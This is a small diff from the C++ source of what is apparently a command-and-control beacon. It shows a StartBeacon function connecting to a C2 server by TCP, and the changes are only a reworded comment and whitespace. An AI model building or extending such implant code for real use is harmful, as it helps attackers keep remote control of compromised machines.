@@ -145,14 +145,14 @@ void StartBeacon(char* C2Server, int C2Port)
 		addr.sin_addr.s_addr = inet_addr(C2Server);
 		addr.sin_port = htons(C2Port);
 
-		// This if statement triggers if connection to C&C errored out.
+		// This if statement performs connection and triggers if connection to C&C errored out.
 		if (connect(tcpsock, (SOCKADDR*)&addr, sizeof(addr))==SOCKET_ERROR) {
 			std::cout << "[-] Error during connection..\n";
 			closesocket(tcpsock);
 			WSACleanup();
 			continue;
 		}
-
+		
 		// Else connection successfull..
 		else {
 			std::cout << "[DBG] Connected to " << C2Server << ":" << C2Port << std::endl;
